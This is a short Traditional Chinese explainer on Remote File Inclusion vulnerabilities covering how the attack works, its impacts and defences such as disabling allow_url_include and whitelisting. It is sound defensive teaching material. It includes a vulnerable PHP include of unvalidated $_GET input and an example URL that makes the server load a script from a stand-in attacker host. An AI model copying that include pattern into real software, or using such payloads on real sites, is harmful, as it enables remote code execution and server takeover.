# Remote File Inclusion

> Remote File Inclusion（RFI，遠程文件包含）是一種嚴重的網頁應用漏洞，攻擊者可以利用此漏洞讓應用程式包含並執行來自遠端伺服器的惡意程式碼文件[1][2]。

## RFI 的運作原理

- 當應用程式動態包含檔案時，若直接使用使用者輸入的檔案路徑且未做適當驗證，攻擊者可提供一個遠端 URL 作為參數。
- 伺服器會從該遠端 URL 載入並執行該檔案中的程式碼，通常是攻擊者控制的惡意腳本。
- 例如 PHP 程式碼中：
  ```php
  $file = $_GET['file'];
  include($file);
  ```
  攻擊者可透過`http://example.com/?file=http://attacker.com/evil.php`讓伺服器執行惡意程式碼[2][5]。

## 可能造成的危害

- 遠端程式碼執行（RCE），攻擊者可完全控制伺服器。
- 敏感資料洩漏。
- 進一步發動跨站腳本攻擊（XSS）、拒絕服務（DoS）等。
- 系統全面妥協，造成嚴重安全事件[1][2][5]。

## 常見發生環境

- 多見於舊版本 PHP 應用，且`allow_url_include`設定為開啟。
- 其他語言或平台如 JSP、ASP 也可能存在類似漏洞[1][5]。

## 防範與修復建議

- **禁止遠端文件包含**：關閉 PHP 設定中的`allow_url_include`。
- **避免直接使用使用者輸入作為包含路徑**，改用固定路徑或預先定義的白名單。
- **使用白名單機制**，只允許包含可信的本地文件。
- **嚴格驗證與過濾輸入**，避免注入惡意 URL。
- **定期使用自動化掃描工具檢測 RFI 漏洞**，及早發現並修補[2][5]。

---

總結來說，Insecure Remote File Include（不安全的遠程文件包含）是一種因未妥善驗證使用者輸入導致攻擊者能將遠端惡意程式碼注入並執行的漏洞，嚴重時可導致系統全面被攻陷。透過關閉遠程包含功能、使用白名單及嚴格輸入驗證是防範此漏洞的關鍵措施。

---

**參考來源:**

[1] https://www.invicti.com/learn/remote-file-inclusion-rfi/ \
[2] https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/ \
[3] https://ithelp.ithome.com.tw/m/articles/10270171 \
[4] https://www.spanning.com/blog/file-inclusion-vulnerabilities-lfi-rfi-web-based-application-security-part-9/ \
[5] https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion \
[6] https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion \
[7] https://www.cnblogs.com/LittleHann/p/3665062.html \
[8] https://zerothreat.ai/blog/remote-file-inclusion-the-security-threat-you-might-be-ignoring

---

[返回目錄](./../README.md)
